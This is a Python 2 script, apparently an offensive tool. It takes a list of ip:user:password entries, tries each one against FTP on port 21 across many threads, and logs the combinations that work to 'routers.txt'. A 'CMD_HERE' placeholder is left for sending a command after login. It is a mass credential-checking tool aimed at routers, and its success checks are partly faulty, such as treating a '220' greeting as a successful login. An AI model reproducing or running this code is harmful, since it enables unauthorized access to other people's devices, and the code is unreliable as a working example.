#!/usr/bin/python
# -*- coding: utf8 -*-

import socket
import re
import sys
import Queue
import threading
import time
from string import *

if len (sys.argv) < 3:
	print "usage : {0} inFile threads bufsize".format(sys.argv[0])
	sys.exit(0)

inFile = sys.argv[1]
threads = sys.argv[2]
bufsiz = int(sys.argv[3])


cmd = "CMD_HERE\r\n" #optional




routers = []

IAC  = chr(255) # ayy lmao : http://svn.python.org/projects/python/trunk/Demo/sockets/telnet.py
DONT = chr(254)
DO   = chr(253)
WONT = chr(252)
WILL = chr(251)

with open(inFile, "rb") as f:
	routers = f.readlines()
	f.close()

q = Queue.Queue()
for router in routers:
	q.put(router)


def rifk(queue):
	queue_full = True
	while queue_full:
		try:
			router = queue.get(False)
			router = router.replace('\r', '').replace('\n', '')
			router = router.split(":")
			ip,user,passw = router[:3]
			#print router
		except Queue.Empty:
			queue_full = False

		login(ip, user, passw)


#def sendShit(shit):
#	sock.sendall(shit + "\r\n")

def writeLog(item):
	with open("routers.txt", "a+") as validFile:
		validFile.write(item + '\n')
		validFile.close()


def login(ip, user, passw):
	iac = 0
	opt = ''
	global sock
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		sock.connect((ip, 21))
		print "Connected"
	except:
		print "Failed to connect."
		sys.exit()

	
	while 1:
		data = sock.recv(bufsiz)
		#print data for debugging
		if not data:
			print "Closed by remote host"
			sys.exit()


		cleandata = ''
		for c in data:
			if opt:
				print ord(c)
				sock.send(opt + c)
				opt = ''
			elif iac:
				iac = 0
				if c == IAC:
					cleandata = cleandata + c
				elif c in (DO, DONT):
					opt = IAC + WONT
				elif c in (WILL, WONT):
					opt = IAC + DONT
				else:
					print "woops", ord(c)
			elif c == IAC:
				iac = 1

			else:
				cleandata = cleandata + c
		try:

			sock.sendall("USER " + user + '\r\n')
			time.sleep(2)
			sock.sendall("PASS " + passw + '\r\n')
			time.sleep(2)
			recieved = sock.recv(bufsiz)

			if "220" in recieved:
				writeLog("{0}:{1}:{2}".format(ip,user,passw))
				sys.exit()
			elif "Password required" in recieved:
				time.sleep(2)
				sock.sendall("PASS " + passw + '\r\n')
				if "logged in" in recieved or "ucftpd" in recieved or "FTPd" in recieved or "FTP" in recieved or "ftp" in recieved:
					writeLog("{0}:{1}:{2}".format(ip,user,passw))
					sys.exit()
				else:
					sys.exit()

			if "Login incorrect" in recieved:
				print "Incorrect login."
				sys.exit()
			elif "logged in" in recieved:
				print "Successful login! [{0}:{1}:{2}]".format(ip,user,passw)
				writeLog("{0}:{1}:{2}".format(ip,user,passw))
				sys.exit()
			elif "Please login" in recieved:
				sock.sendall("USER " + user + '\r\n')
				time.sleep(2)
				sock.sendall("PASS " + passw + '\r\n')
				if "logged in" in recieved:
					writeLog("{0}:{1}:{2}".format(ip,user,passw))
					sys.exit()
				else:
					sys.exit()
			else:
				print "[DEBUG] " + recieved
				sys.exit()


		except Exception as e:
			print "Exception. ({0})".format(str(e))





for i in range(int(threads)):
	t = threading.Thread(target=rifk, args = (q,))
	t.start()
	print "started thread"


				



